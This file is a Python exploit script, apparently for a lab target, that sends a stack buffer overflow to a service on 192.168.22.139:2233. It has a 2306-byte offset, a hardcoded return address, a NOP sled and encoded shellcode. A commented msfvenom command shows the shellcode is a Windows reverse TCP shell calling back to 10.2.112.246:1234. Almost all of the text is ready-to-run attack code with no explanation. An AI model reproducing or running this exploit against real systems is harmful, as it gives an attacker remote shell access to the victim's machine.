#msfvenom -p windows/shell_reverse_tcp LHOST=10.2.112.246 LPORT=1234 EXITFUNC=thread -b "huaizifu" -f c
import socket

ip = "192.168.22.139"
port = 2233

prefix = ""
offset = 2306
overflow = "A" * offset
retn = "\x0d\x11\x20\x11"
padding = "\x90"*16
payload = ("\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\xa8\x16\x93\x9b\x83\xee\xfc\xe2\xf4\x54\xfe\x11\x9b\xa8\x16"
"\xf3\x12\x4d\x27\x53\xff\x23\x46\xa3\x10\xfa\x1a\x18\xc9\xbc"
"\x9d\xe1\xb3\xa7\xa1\xd9\xbd\x99\xe9\x3f\xa7\xc9\x6a\x91\xb7"
"\x88\xd7\x5c\x96\xa9\xd1\x71\x69\xfa\x41\x18\xc9\xb8\x9d\xd9"
"\xa7\x23\x5a\x82\xe3\x4b\x5e\x92\x4a\xf9\x9d\xca\xbb\xa9\xc5"
"\x18\xd2\xb0\xf5\xa9\xd2\x23\x22\x18\x9a\x7e\x27\x6c\x37\x69"
"\xd9\x9e\x9a\x6f\x2e\x73\xee\x5e\x15\xee\x63\x93\x6b\xb7\xee"
"\x4c\x4e\x18\xc3\x8c\x17\x40\xfd\x23\x1a\xd8\x10\xf0\x0a\x92"
"\x48\x23\x12\x18\x9a\x78\x9f\xd7\xbf\x8c\x4d\xc8\xfa\xf1\x4c"
"\xc2\x64\x48\x49\xcc\xc1\x23\x04\x78\x16\xf5\x7e\xa0\xa9\xa8"
"\x16\xfb\xec\xdb\x24\xcc\xcf\xc0\x5a\xe4\xbd\xaf\xe9\x46\x23"
"\x38\x17\x93\x9b\x81\xd2\xc7\xcb\xc0\x3f\x13\xf0\xa8\xe9\x46"
"\xcb\xf8\x46\xc3\xdb\xf8\x56\xc3\xf3\x42\x19\x4c\x7b\x57\xc3"
"\x04\xf1\xad\x7e\x53\x33\xbe\x9e\xfb\x99\xa8\x17\x28\x12\x4e"
"\x7c\x83\xcd\xff\x7e\x0a\x3e\xdc\x77\x6c\x4e\x2d\xd6\xe7\x97"
"\x57\x58\x9b\xee\x44\x7e\x63\x2e\x0a\x40\x6c\x4e\xc0\x75\xfe"
"\xff\xa8\x9f\x70\xcc\xff\x41\xa2\x6d\xc2\x04\xca\xcd\x4a\xeb"
"\xf5\x5c\xec\x32\xaf\x9a\xa9\x9b\xd7\xbf\xb8\xd0\x93\xdf\xfc"
"\x46\xc5\xcd\xfe\x50\xc5\xd5\xfe\x40\xc0\xcd\xc0\x6f\x5f\xa4"
"\x2e\xe9\x46\x12\x48\x58\xc5\xdd\x57\x26\xfb\x93\x2f\x0b\xf3"
"\x64\x7d\xad\x73\x86\x82\x1c\xfb\x3d\x3d\xab\x0e\x64\x7d\x2a"
"\x95\xe7\xa2\x96\x68\x7b\xdd\x13\x28\xdc\xbb\x64\xfc\xf1\xa8"
"\x45\x6c\x4e")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
